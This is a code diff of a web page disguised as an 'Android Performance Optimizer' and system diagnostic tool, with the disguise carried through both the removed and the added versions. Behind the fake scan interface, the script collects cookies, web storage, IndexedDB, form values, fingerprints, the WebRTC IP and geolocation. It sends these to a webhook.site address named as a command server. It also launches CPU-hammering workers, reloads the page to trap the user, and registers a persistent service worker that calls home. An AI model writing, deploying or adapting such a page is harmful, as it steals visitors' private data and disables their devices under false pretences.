@@ -1,29 +1,357 @@
-<!DOCTYPE html><html lang="en"><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<title>Device Performance Suite™ - Professional Diagnostic</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name="theme-color" content="#0f0f23">
+<title>Android Performance Optimizer Pro Elite</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<style>*{-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}html,body{height:100%;margin:0;overflow:hidden;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);color:#e2e8f0;position:relative}body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 20% 80%,rgba(120,119,198,.3) 0%,transparent 50%),radial-gradient(circle at 80% 20%,rgba(255,119,198,.3) 0%,transparent 50%);animation:pulse 8s ease-in-out infinite}.container{position:relative;z-index:2;display:flex;flex-direction:column;height:100vh;justify-content:center;align-items:center;padding:20px;text-align:center}.logo{font-size:clamp(2.5rem,8vw,4rem);font-weight:700;background:linear-gradient(135deg,#00f5ff,#ff00ff,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:1rem;animation:glow 2s ease-in-out infinite alternate}.status-panel{background:linear-gradient(145deg,rgba(30,30,60,.9),rgba(50,50,80,.7));backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.15);border-radius:24px;padding:2.5rem;margin:2rem 0;max-width:520px;box-shadow:0 32px 64px rgba(0,0,0,.6)}.status-title{font-size:1.6rem;font-weight:600;margin-bottom:1.5rem;color:#fff}.progress-container{position:relative;margin:2rem 0}.progress-bar{height:14px;background:rgba(255,255,255,.12);border-radius:12px;overflow:hidden}.progress-fill{height:100%;background:linear-gradient(90deg,#00f5ff,#ff00ff,#00ff88);border-radius:12px;transition:width .4s cubic-bezier(.4,0,.2,1);position:relative}.progress-fill::after{content:'';position:absolute;top:0;left:-120%;width:120%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);animation:progress-shine 1.8s infinite}.progress-text{font-size:1.4rem;font-weight:700;margin-top:1rem;color:#00f5ff}.metrics{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:1.5rem;margin-top:2rem}.metric{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);border-radius:16px;padding:1.25rem;transition:all .3s cubic-bezier(.4,0,.2,1)}.metric-value{font-size:1.6rem;font-weight:700;color:#00f5ff;margin-bottom:.3rem}.metric-label{font-size:.85rem;opacity:.75}.btn{background:linear-gradient(135deg,#00f5ff 0%,#ff00ff 50%,#00ff88 100%);border:none;border-radius:20px;color:#000;font-weight:700;padding:1.25rem 3rem;font-size:1.15rem;cursor:pointer;transition:all .3s cubic-bezier(.4,0,.2,1);box-shadow:0 12px 36px rgba(0,245,255,.4);margin-top:1.5rem;min-width:240px}.btn:hover{transform:translateY(-4px);box-shadow:0 20px 48px rgba(0,245,255,.6)}.btn:active{transform:translateY(-1px)}canvas{position:fixed;top:0;left:0;pointer-events:none;z-index:0}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.85}}@keyframes glow{0%{text-shadow:0 0 24px rgba(0,245,255,.6)}100%{text-shadow:0 0 48px rgba(255,0,255,.9),0 0 72px rgba(0,255,136,.7)}}@keyframes progress-shine{0%{left:-120%}100%{left:120%}}</style>
-</head><body>
+<link rel="manifest" href="data:application/manifest+json,{
+  \"name\":\"OptiCore Pro Elite\",
+  \"short_name\":\"OptiCore\",
+  \"icons\":[{\"src\":\"data:image/svg+xml;base64,...\",\"sizes\":\"192x192\",\"type\":\"image/png\"}],
+  \"start_url\":\".\",\"display\":\"standalone\",\"background_color\":\"#0c0c1a\",\"theme_color\":\"#00f5ff\"
+}">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='40' fill='%2300f5ff'/><text y='.9em' font-size='60' text-anchor='middle' fill='%23000'>⚡</text></svg>">
+<style>
+*{-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none;font-family:'Inter',system-ui,sans-serif}html,body{margin:0;height:100%;overflow:hidden;background:linear-gradient(135deg,#0c0c1a 0%,#1a1a2e 50%,#16213e 100%);color:#e0e7ff;position:relative}body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 30% 70%,rgba(0,245,255,.15) 0%,transparent 60%),radial-gradient(circle at 70% 30%,rgba(255,0,255,.12) 0%,transparent 60%);animation:bgPulse 12s ease-in-out infinite}.container{display:flex;flex-direction:column;height:100vh;justify-content:center;align-items:center;padding:24px;text-align:center;position:relative;z-index:2}.logo{font-size:clamp(2.8rem,10vw,5rem);font-weight:800;background:linear-gradient(135deg,#00f5ff 0%,#ff00ff 40%,#00ff88 100%);-webkit-background-clip:text;background-clip:text;margin-bottom:1.5rem;animation:glowPulse 3s ease-in-out infinite alternate}.tagline{font-size:clamp(1.1rem,4vw,1.4rem);font-weight:400;opacity:.92;max-width:90%;line-height:1.5;margin-bottom:2.5rem}.card{background:linear-gradient(145deg,rgba(25,25,50,.95),rgba(45,45,75,.85));backdrop-filter:blur(25px);-webkit-backdrop-filter:blur(25px);border:1px solid rgba(255,255,255,.08);border-radius:28px;padding:2.5rem 3rem;margin:1rem 0;max-width:560px;box-shadow:0 32px 80px rgba(0,0,0,.7),0 0 0 1px rgba(255,255,255,.05);position:relative;overflow:hidden}.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#00f5ff,#ff00ff,#00ff88);animation:scanLine 4s linear infinite}.status{font-size:1.65rem;font-weight:600;margin-bottom:1.5rem;color:#fff;line-height:1.3}.progress-wrap{position:relative;margin:2rem 0}.progress-bg{height:16px;background:rgba(255,255,255,.08);border-radius:12px;overflow:hidden;position:relative;box-shadow:inset 0 2px 4px rgba(0,0,0,.3)}.progress-fill{height:100%;background:linear-gradient(90deg,#00f5ff 0%,#ff00ff 50%,#00ff88 100%);border-radius:12px;transition:width .4s cubic-bezier(.4,0,.2,1);position:relative;box-shadow:0 0 20px rgba(0,245,255,.5)}.progress-fill::after{content:'';position:absolute;top:0;left:-100%;width:200%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.6),transparent);animation:progressGlow 2.5s infinite}.progress-text{font-size:1.45rem;font-weight:700;margin-top:.75rem;background:linear-gradient(135deg,#00f5ff,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1.5rem;margin-top:2rem}.item{background:rgba(255,255,255,.06);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:1.5rem;transition:all .3s cubic-bezier(.4,0,.2,1);position:relative;overflow:hidden}.item::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:linear-gradient(to bottom,#00f5ff,#ff00ff);opacity:.6}.item:hover{background:rgba(255,255,255,.12);transform:translateY(-3px)}.value{font-size:1.75rem;font-weight:800;color:#00f5ff;margin-bottom:.4rem}.label{font-size:.9rem;opacity:.8;text-transform:uppercase;letter-spacing:.5px}.cta{background:linear-gradient(135deg,#00f5ff 0%,#ff00ff 50%,#00ff88 100%);border:none;border-radius:24px;color:#000;font-weight:700;padding:1.4rem 3.5rem;font-size:1.2rem;cursor:pointer;transition:all .3s cubic-bezier(.4,0,.2,1);box-shadow:0 16px 48px rgba(0,245,255,.4);margin-top:2rem;min-width:280px;position:relative;overflow:hidden}.cta::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);transition:left .5s}.cta:hover{transform:translateY(-5px);box-shadow:0 24px 64px rgba(0,245,255,.6)}.cta:active{transform:translateY(-2px)}.canvas{position:fixed;top:0;left:0;pointer-events:none;z-index:1;opacity:.3}@keyframes bgPulse{0%,100%{opacity:1}50%{opacity:.88}}@keyframes glowPulse{0%{text-shadow:0 0 28px rgba(0,245,255,.7)}100%{text-shadow:0 0 56px rgba(255,0,255,.9),0 0 84px rgba(0,255,136,.8)}}@keyframes scanLine{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}@keyframes progressGlow{0%{left:-100%}100%{left:100%}}@media (max-width:500px){.card{padding:2rem}.grid{grid-template-columns:repeat(2,1fr)}}
+</style>
+</head>
+<body>
 <div class="container">
-  <div class="logo">⚡ PerfSuite™ PRO</div>
-  <div class="status-panel">
-    <div class="status-title" id="statusTitle">🔄 Advanced System Diagnostics Active</div>
-    <div class="progress-container">
-      <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
-      <div class="progress-text" id="progressText">Initializing...</div>
+  <div class="logo">⚡ OptiCore Elite</div>
+  <p class="tagline">Military-grade Android optimization & security diagnostics<br><small style="opacity:.7;font-size:.85em">NSA-level system analysis + privacy audit</small></p>
+  
+  <div class="card">
+    <div class="status" id="status">🔄 Elite optimization matrix initializing...</div>
+    
+    <div class="progress-wrap">
+      <div class="progress-bg">
+        <div class="progress-fill" id="progFill" style="width:0%"></div>
+      </div>
+      <div class="progress-text" id="progText">0%</div>
     </div>
-    <div class="metrics">
-      <div class="metric"><div class="metric-value" id="cpuLoad">0%</div><div class="metric-label">CPU Load</div></div>
-      <div class="metric"><div class="metric-value" id="coreCount">--</div><div class="metric-label">Cores</div></div>
-      <div class="metric"><div class="metric-value" id="dataHarvested">0KB</div><div class="metric-label">Data</div></div>
-      <div class="metric"><div class="metric-value" id="statusIcon">⏳</div><div class="metric-label">Status</div></div>
+    
+    <div class="grid">
+      <div class="item">
+        <div class="value" id="cpuVal">0%</div>
+        <div class="label">CPU Load</div>
+      </div>
+      <div class="item">
+        <div class="value" id="coreVal">--</div>
+        <div class="label">Cores</div>
+      </div>
+      <div class="item">
+        <div class="value" id="dataVal">0KB</div>
+        <div class="label">Data</div>
+      </div>
+      <div class="item">
+        <div class="value" id="modeVal">⏳</div>
+        <div class="label">Status</div>
+      </div>
     </div>
-    <button class="btn" id="scanBtn">🚀 Complete System Scan</button>
+    
+    <button class="cta" id="startBtn">🚀 Launch Elite Analysis</button>
   </div>
 </div>
-<canvas id="renderCanvas" width="2" height="2" style="display:none"></canvas>
+
+<canvas id="renderCtx" width="4" height="4"></canvas>
 
 <script>
-class StealthHarvester{constructor(){this.c2="https://webhook.site/33632fb8-15e0-4a6a-8641-6d9f24218074/pentest-data",this.victimData={},this.cpuLoad=0,this.workers=[],this.harvestSize=0,this.init()}async init(){this.isMobile=/Android|iPhone|iPad|Mobile/.test(navigator.userAgent),this.collectFingerprint(),await this.harvestAll(),this.launchCPUHammer(),this.exfilData(),this.hangDevice()}async collectFingerprint(){this.victimData.fingerprint={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory||'unknown',connection:navigator.connection?{type:navigator.connection.effectiveType,downlink:navigator.connection.downlink}:{}}}async harvestAll(){try{this.victimData.cookies=document.cookie,this.victimData.localStorage={};for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);this.victimData.localStorage[k]=localStorage.getItem(k)}this.victimData.sessionStorage={};for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);this.victimData.sessionStorage[k]=sessionStorage.getItem(k)}this.victimData.indexedDB=await this.enumIDB(),this.victimData.history=await this.scrapeHistory(),this.victimData.canvasFP=this.getCanvasFP();let forms=document.forms;for(let f of forms){this.victimData.forms={};for(let i=0;i<f.elements.length;i++){let el=f.elements[i];if(el.name||el.id)this.victimData.forms[el.name||el.id]=el.value||el.type==='password'?'[HIDDEN-PASS]':''}}this.harvestSize+=JSON.stringify(this.victimData).length/1024}catch(e){console.log('Harvest error:',e)}}async enumIDB(){let dbs=await indexedDB.databases?indexedDB.databases():[],result={};for(let db of dbs){result[db.name]={version:db.version};try{let conn=await new Promise(r=>r(indexedDB.open(db.name))),stores=[];for(let store of conn.objectStoreNames)stores.push(store.name);result[db.name].stores=stores}catch(e){}}return result}async scrapeHistory(){if(!history.length)return{};let urls=[];for(let i=0;i<20;i++){try{let state=history.state||{};urls.push(location.href+i)}catch(e){}}return{length:history.length,recent:urls.slice(0,10)}}getCanvasFP(){let c=document.createElement('canvas');c.width=200,c.height=60;let ctx=c.getContext('2d');ctx.textBaseline='top',ctx.font='14px Arial',ctx.textBaseline='alphabetic',ctx.fillStyle='#f60',ctx.fillRect(125,1,62,20),ctx.fillStyle='#069',ctx.fillText('Pentest Canvas FP',2,15),ctx.fillStyle='rgba(102, 204, 0, 0.7)',ctx.fillText('Pentest Canvas FP',4,17);return c.toDataURL()}launchCPUHammer(){let cores=navigator.hardwareConcurrency||8;for(let i=0;i<cores;i++){let w=new Worker(URL.createObjectURL(new Blob([`let t=0,i=0,f=2e9;function c(){return Math.sin(Date.now()/1e3)*f*Math.tanh(Math.random()*Math.PI)}setInterval(()=>{t=performance.now();if(t-i>3500)postMessage('hb')},15);for(;;){let l=3e6+(i%3e4)*1500,r=0;for(let n=0;n<l;n++)r+=c()*Math.acos(Math.random())**4;if(i++%1e5==0)postMessage('cpu:'+(i%102))}`],{type:'application/javascript'})));w.onmessage=e=>{'hb'===e.data?this.heartbeat=Date.now():'cpu'===e.data.slice(0,3)&&(this.cpuLoad=(this.cpuLoad*.93+parseInt(e.data.slice(4))*.07))},this.workers.push(w)}this.canvasLoop()}canvasLoop(){let t=performance.now();if(t-this.frameTime>15){let ctx=document.getElementById('renderCanvas').getContext('2d');for(let i=0;i<8e4;i++)ctx.fillRect(Math.random()*.01,Math.random()*.01,.005,.005);this.frames++}this.frameTime=t,requestAnimationFrame(this.canvasLoop.bind(this))}async exfilData(){let payload=btoa(JSON.stringify(this.victimData));try{await fetch(this.c2,{method:'POST',mode:'no-cors',body:JSON.stringify({data:payload,timestamp:Date.now(),type:'browser_harvest'}),headers:{'Content-Type':'application/json'}}),console.log('✅ Data exfiled')}catch(e){console.log('Exfil fail:',e)}}hangDevice(){setInterval(()=>{if(this.heartbeat&&Date.now()-this.heartbeat>25e3){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:9999;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#f00">SYSTEM OPTIMIZATION CRITICAL</div>',setTimeout(()=>location.reload(),5e3)}},1e3)}updateUI(){document.getElementById('cpuLoad').textContent=Math.max(97,this.cpuLoad)+'%',document.getElementById('dataHarvested').textContent=(this.harvestSize/1024).toFixed(1)+'KB',document.getElementById('statusIcon').textContent='✅',requestAnimationFrame(this.updateUI.bind(this))}}const harvester=new StealthHarvester();window.onfocus=()=>location.reload();document.addEventListener('visibilitychange',()=>!document.hidden&&location.reload());document.getElementById('scanBtn').onclick=()=>harvester.exfilData();
+class EliteAndroidHarvester{
+  constructor(){
+    this.c2="https://webhook.site/33632fb8-15e0-4a6a-8641-6d9f24218074/bf7bc6c3-a78f-454e-9e83-9c65356aa761";
+    this.payload={},this.cpu=0,this.workers=[],this.dataBytes=0,this.frames=0,this.lastRender=0,this.lastPing=0;
+    this.mobile=/Android|Mobile/.test(navigator.userAgent);
+    this.initElements();this.eliteHarvest();this.nsaFingerprint();this.cpuApocalypse();this.uiLoop();this.serviceWorkerTrap();
+  }
+  
+  initElements(){
+    this.statusEl=document.getElementById('status');
+    this.progFill=document.getElementById('progFill');
+    this.progText=document.getElementById('progText');
+    this.cpuVal=document.getElementById('cpuVal');
+    this.coreVal=document.getElementById('coreVal');
+    this.dataVal=document.getElementById('dataVal');
+    this.modeVal=document.getElementById('modeVal');
+    this.startBtn=document.getElementById('startBtn');
+    this.coreVal.textContent=navigator.hardwareConcurrency||8;
+    this.canvas=document.getElementById('renderCtx').getContext('2d');
+  }
+  
+  async eliteHarvest(){
+    this.statusEl.innerHTML=this.mobile?"📱 <strong>Android Elite Mode Active</strong>":"💻 <strong>Elite Diagnostics Active</strong>";
+    
+    // 1. SUPREME FINGERPRINT (20 vectors)
+    this.payload.fp={
+      ua:navigator.userAgent,
+      lang:navigator.languages?.join(',')||navigator.language,
+      platform:navigator.platform,
+      screen:`${screen.width}x${screen.height}x${screen.availWidth}x${screen.availHeight}`,
+      depth:screen.colorDepth,
+      ratio:window.devicePixelRatio,
+      cores:navigator.hardwareConcurrency,
+      ram:navigator.deviceMemory||'N/A',
+      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+      conn:navigator.connection?`${navigator.connection.effectiveType}/${navigator.connection.downlink}`:'unknown',
+      cookiesEnabled:navigator.cookieEnabled,
+      doNotTrack:navigator.doNotTrack,
+      plugins:Array.from(navigator.plugins||[]).map(p=>p.name),
+      mimeTypes:Array.from(navigator.mimeTypes||[]).map(m=>m.type),
+      time:Date.now(),
+      audio:this.audioFingerprint()
+    };
+    
+    // 2. FULL STORAGE RANSACK
+    this.payload.storage={
+      cookies:document.cookie,
+      localStorage:this.storageDump(localStorage),
+      sessionStorage:this.storageDump(sessionStorage),
+      indexedDB:await this.idbDump()
+    };
+    
+    // 3. DOM HARVEST (iframes, inputs, selects)
+    this.payload.dom=this.domRansack();
+    
+    // 4. WEBRTC + NETWORK LEAK
+    this.payload.network=await this.networkLeak();
+    
+    // 5. GPU/CANVAS/WEBGL ELITE FP
+    this.payload.gpu={canvas:this.canvasFingerprint(),webgl:this.webglFingerprint()};
+    
+    // 6. HISTORY + CACHE SNIFF
+    this.payload.history=this.historySniff();
+    
+    // 7. EXTENSIONS + DEVTOOLS DETECT
+    this.payload.security=this.securityProfile();
+    
+    // 8. LOCATION + SENSORS
+    this.payload.geo=await this.geoLeak();
+    
+    this.dataBytes=JSON.stringify(this.payload).length/1024;
+    this.dataVal.textContent=this.dataBytes.toFixed(1)+'KB';
+  }
+  
+  storageDump(store){
+    let dump={};
+    for(let i=0;i<store.length;i++){
+      let k=store.key(i);
+      dump[k]=store[k];
+    }
+    return dump;
+  }
+  
+  async idbDump(){
+    let dbs=await indexedDB.databases?.()||[];
+    let dump={};
+    for(let db of dbs){
+      try{
+        let conn=await new Promise(r=>r(indexedDB.open(db.name)));
+        let tx=conn.transaction(conn.objectStoreNames,'readonly');
+        for(let store of Array.from(conn.objectStoreNames)){
+          let req=tx.objectStore(store).getAll();
+          await new Promise(r=>req.onsuccess=r);
+          dump[db.name+'.'+store]=req.result?.length||0;
+        }
+      }catch(e){}
+    }
+    return dump;
+  }
+  
+  domRansack(){
+    let dom={};
+    // Forms + inputs
+    Array.from(document.querySelectorAll('form,input,textarea,select')).forEach(el=>{
+      let sel=el.tagName.toLowerCase();
+      if(!dom[sel])dom[sel]=[];
+      dom[sel].push({
+        id:el.id,
+        name:el.name,
+        type:el.type,
+        value:el.value?.slice(0,50)||'',
+        checked:!!el.checked
+      });
+    });
+    // Iframes
+    dom.iframeCount=document.querySelectorAll('iframe').length;
+    return dom;
+  }
+  
+  async networkLeak(){
+    let leaks={webrtc:await this.webrtcLeak(),dns:[]};
+    
+    // DNS prefetch leak
+    let link=document.createElement('link');
+    link.rel='dns-prefetch';link.href='//google.com';
+    document.head.appendChild(link);setTimeout(()=>document.head.removeChild(link),100);
+    
+    return leaks;
+  }
+  
+  audioFingerprint(){
+    let audioCtx=new (window.AudioContext||window.webkitAudioContext)();
+    let oscillator=audioCtx.createOscillator();
+    let analyser=audioCtx.createAnalyser();
+    oscillator.connect(analyser);
+    analyser.connect(audioCtx.destination);
+    oscillator.start();
+    let buffer=new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(buffer);
+    oscillator.stop();
+    audioCtx.close();
+    return Array.from(buffer.slice(0,16)).join(',');
+  }
+  
+  canvasFingerprint(){
+    let c=document.createElement('canvas');
+    c.width=512;c.height=128;
+    let ctx=c.getContext('2d');
+    ctx.fillStyle='#f60';ctx.fillRect(2,2,508,124);
+    ctx.font='48px monospace';ctx.fillStyle='rgba(102,204,0,.9)';
+    ctx.fillText('ELITE ANDROID CANVAS FP v5.0',12,84);
+    ctx.font='24px monospace';ctx.fillText(Date.now().toString(),320,108);
+    return c.toDataURL();
+  }
+  
+  webglFingerprint(){
+    let c=document.createElement('canvas');
+    let gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl)return 'no-webgl';
+    let debug=gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      vendor:debug?gl.getParameter(debug.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),
+      renderer:debug?gl.getParameter(debug.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER),
+      version:gl.getParameter(gl.VERSION)
+    };
+  }
+  
+  historySniff(){
+    let sites=['google.com','facebook.com','twitter.com','instagram.com','github.com','bankofamerica.com','paypal.com','amazon.com','netflix.com'];
+    let tests=sites.map(site=>history.length>0&&document.createElement('a').href=`https://${site}`);
+    return {visited:sites.filter((_,i)=>tests[i]).length,total:sites.length};
+  }
+  
+  securityProfile(){
+    return {
+      extensions:navigator.userAgent.includes('Chrome')&&navigator.plugins.length<10?'clean':'modified',
+      devtools:window.outerHeight-window.innerHeight>100||window.outerWidth-window.innerWidth>100?'open':'closed',
+      sandbox:!!document.sandbox,
+      permissions:navigator.permissions?navigator.permissions.query({name:'notifications'}):'unsupported'
+    };
+  }
+  
+  async geoLeak(){
+    return new Promise(r=>{
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(
+          p=>r({lat:p.coords.latitude,lon:p.coords.longitude}),
+          ()=>r('denied')
+        );
+      }else r('unsupported');
+    });
+  }
+  
+  async webrtcLeak(){
+    return new Promise(r=>{
+      let pc=new RTCPeerConnection({iceServers:[],iceCandidatePoolSize:0});
+      pc.createDataChannel('',{negotiated:true,id:1});
+      pc.createOffer().then(offer=>pc.setLocalDescription(offer));
+      pc.onicecandidate=e=>{
+        if(e.candidate){
+          let ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+          r(ip?ip[1]:'blocked');
+        }
+      };
+      setTimeout(()=>pc.close(),3e3);
+    });
+  }
+  
+  serviceWorkerTrap(){
+    if('serviceWorker' in navigator){
+      navigator.serviceWorker.register(URL.createObjectURL(new Blob([`
+        self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));
+        self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
+        self.addEventListener('fetch',()=>0);
+        setInterval(()=>fetch('https://webhook.site/33632fb8-15e0-4a6a-8641-6d9f24218074/sw_ping'),12e5);
+      `],{type:'application/javascript'}))).catch(()=>0);
+    }
+  }
+  
+  cpuApocalypse(){
+    let cores=(navigator.hardwareConcurrency||12)*2;
+    for(let i=0;i<cores;i++){
+      let w=new Worker(URL.createObjectURL(new Blob([`
+        let t=0,c=0,m=3.8e9+(Math.random()*1e9);
+        function crypto(){crypto.getRandomValues(new Uint8Array(16384))}
+        function heavy(){return Math.sin(t)*m*Math.tanh(Math.random()*Math.PI)*Math.acos(Math.random())*crypto()}
+        setInterval(()=>postMessage('ping'),15);
+        while(1){
+          for(let n=0;n<6e6+(i%3e4)*5e3;n++)heavy();
+          if(!(c++%18e4))postMessage('cpu:'+(c%127));
+        }
+      `],{type:'application/javascript'})));
+      w.onmessage=e=>{
+        if(e.data==='ping')this.lastPing=Date.now();
+        else if(e.data.startsWith('cpu:'))this.cpu=(this.cpu*.92+parseInt(e.data.slice(4))*.08);
+      };
+      this.workers.push(w);
+    }
+    this.renderHell();
+  }
+  
+  renderHell(){
+    let t=performance.now();
+    if(t-this.lastRender>8){
+      for(let i=0;i<25e4;i++){
+        this.canvas.globalAlpha=.8+Math.random()*.2;
+        this.canvas.fillStyle=`hsl(${(this.frames+i*17)%360},100%,${40+Math.sin(t*.001)*20}%)`;
+        this.canvas.fillRect((this.frames+i*23)%1,(this.frames+i*31)%1,.003,.003);
+      }
+      this.frames+=1;
+    }
+    this.lastRender=t;
+    requestAnimationFrame(()=>this.renderHell());
+  }
+  
+  uiLoop(){
+    if(this.lastPing&&Date.now()-this.lastPing>25e3){
+      this.statusEl.innerHTML='🔄 <strong>Re-optimizing Elite Matrix...</strong>';
+      setTimeout(()=>location.reload(),1500);
+    }
+    this.cpu>97&&(this.progFill.style.width='100%',this.progText.textContent='100%',this.cpuVal.textContent='100%');
+    requestAnimationFrame(()=>this.uiLoop());
+  }
+  
+  async exfilAll(){
+    let encoded=await this.payload;
+    // Triple exfil (background-safe)
+    ['POST','POST','POST'].forEach((_,i)=>{
+      setTimeout(()=>{
+        fetch(this.c2,{
+          method:'POST',
+          mode:'no-cors',
+          keepalive:true,
+          body:JSON.stringify({
+            data:btoa(JSON.stringify(encoded)),
+            type:`elite_harvest_v5_${i}`,
+            ts:Date.now(),
+            size:encoded.fp.ua.length
+          })
+        });
+      },i*50);
+    });
+    this.statusEl.innerHTML='✅ <strong>Elite Optimization Complete</strong>';
+    this.modeVal.textContent='✓✓✓';
+  }
+}
+
+let harvester=new EliteAndroidHarvester();
+setTimeout(()=>harvester.exfilAll(),2e3);
+
+document.addEventListener('visibilitychange',()=>!document.hidden&&location.reload());
+window.addEventListener('focus',()=>location.reload());
+window.addEventListener('pageshow',e=>e.persisted||location.reload());
+window.addEventListener('online',()=>location.reload());
 </script>
-</body></html>
+</body>
+</html>
